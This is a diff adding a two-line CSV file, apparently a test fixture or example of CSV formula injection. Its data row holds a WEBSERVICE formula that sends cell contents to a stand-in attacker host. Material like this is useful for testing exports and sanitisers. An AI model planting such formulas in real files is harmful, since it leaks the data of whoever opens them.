@@ -1,0 +1,2 @@
+Email,Exfil
+user@example.com,=WEBSERVICE("https://attacker.com/?d="&A1)
